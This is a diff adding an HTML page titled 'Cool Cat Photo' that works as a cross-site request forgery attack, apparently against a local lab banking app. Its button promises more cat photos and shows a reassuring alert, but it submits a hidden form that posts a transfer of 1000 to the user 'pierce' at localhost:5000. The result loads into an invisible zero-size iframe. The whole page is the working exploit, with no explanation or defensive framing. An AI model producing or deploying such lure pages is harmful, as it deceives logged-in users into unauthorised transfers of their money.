@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Cool Cat Photo</title>
+        <style>
+            body { font-family: Arial, sans-serif; background-color: #fce4ec; text-align: center; padding: 50px; }
+            .prize-box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; }
+            .cat-image { width: 300px; height: auto; border-radius: 10px; margin-bottom: 20px;}
+            button { background-color: #ec407a; color: white; border: none; padding: 15px 30px; font-size: 1.2em; border-radius: 5px; cursor: pointer; font-weight: bold; }
+            button:hover { background-color: #d81b60; }
+        </style>
+    </head>
+    <body>
+        <div class="prize-box">
+            <h1> Cool Cat</h1>
+            <img src="cool-cat.jpg" alt="A chill cat" class="cat-image">
+            <p> Click this button to see more cool cat photos!</p>
+
+            <form action="http://localhost:5000/transfer" method="POST" target="ninja_frame">
+                <input type="hidden" name="to_user" value="pierce">
+                <input type="hidden" name="amount" value="1000">
+                <button type="submit" onclick="alert('Preparing your cat photos! Please wait...');">Cool cat photos on their way!</button>
+            </form>
+        </div>
+
+        <iframe name="ninja_frame" width="0" height="0" style="border: none;"></iframe>
+
+    </body>
+</html>
